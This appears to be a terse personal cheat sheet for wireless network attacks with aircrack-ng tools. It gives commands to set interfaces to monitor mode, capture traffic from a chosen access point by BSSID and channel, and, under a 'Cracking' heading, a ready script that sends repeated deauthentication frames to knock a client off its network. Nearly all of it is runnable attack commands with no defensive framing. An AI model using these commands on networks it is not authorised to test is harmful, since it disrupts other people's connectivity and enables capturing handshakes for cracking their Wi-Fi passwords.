## General

### AP `a`
```bash
1 ap
2 sta
3 ap+sta
```

### Filter `s`
```bash
10 first seen
```

## Driver
```bash
https://github.com/aircrack-ng/rtl8812au
```

## Settings
```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

## Monitor

### Generic
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0
airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 1 --output-format csv --write sessions \
            --band bg wlan0
```

### Target
```bash
cat > target.sh << "EndOfMessage"
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 5 --output-format pcap --write target \
            --channel "${1}" --bssid "${2}" wlan0
EndOfMessage

chmod +x target.sh
```

## Cracking
```bash
cat > deauth.sh << "EndOfMessage"
iwconfig wlan1 channel "${1}"

aireplay-ng -0 99 -D -a "${2}" -c "${3}" wlan1
EndOfMessage

chmod +x deauth.sh
```

## Kill View
```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
